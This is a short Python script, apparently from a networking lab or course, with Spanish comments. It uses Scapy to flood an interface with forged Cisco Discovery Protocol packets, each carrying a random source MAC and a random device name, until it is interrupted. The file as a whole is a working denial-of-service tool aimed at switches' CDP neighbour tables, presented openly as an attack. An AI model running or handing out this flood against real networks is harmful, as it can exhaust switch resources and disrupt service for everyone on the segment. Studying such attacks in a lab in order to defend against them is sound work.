#!/usr/bin/env python3
# Script: Attack_DoS_CDP_20250737.py
import sys
import random
import string
from scapy.all import *

load_contrib('cdp')

def generar_cadena_aleatoria(longitud):
    """Genera un nombre de dispositivo aleatorio para simular vecinos falsos."""
    letras = string.ascii_letters + string.digits
    return ''.join(random.choice(letras) for _ in range(longitud))

def lanzar_cdp_flood(interfaz):
    print(f"[*] Lanzando inundación CDP en la interfaz: {interfaz}")
    print("[*] Presiona Ctrl+C para detener el ataque.")
    
    mac_destino_cdp = "01:00:0c:cc:cc:cc"
    
    try:
        while True:
            mac_origen = RandMAC()
            
            capa_l2 = Ether(dst=mac_destino_cdp, src=mac_origen)
            capa_llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP(OUI=0x00000c, code=0x2000)
            
            nombre_dispositivo = generar_cadena_aleatoria(12).encode()
            
            # ✅ Sin prefijo "cdp." — las clases están en el namespace global
            cdp_cabecera    = CDPv2_HDR(vers=2, ttl=180)
            tlv_id_dispositivo = CDPMsgDeviceID(val=nombre_dispositivo)
            tlv_id_puerto   = CDPMsgPortID(iface=b"Ethernet0/1")
            tlv_plataforma  = CDPMsgPlatform(val=b"Cisco IOS Software IOL")
            
            paquete_final = capa_l2 / capa_llc / cdp_cabecera / tlv_id_dispositivo / tlv_id_puerto / tlv_plataforma
            sendp(paquete_final, iface=interfaz, verbose=False)
            
    except KeyboardInterrupt:
        print("\n[+] Ataque finalizado por el usuario.")
    except Exception as e:
        print(f"\n[!] Error durante la ejecución: {e}")

if __name__ == "__main__":
    interfaz_red = "eth0"
    if len(sys.argv) > 1:
        interfaz_red = sys.argv[1]
    lanzar_cdp_flood(interfaz_red)
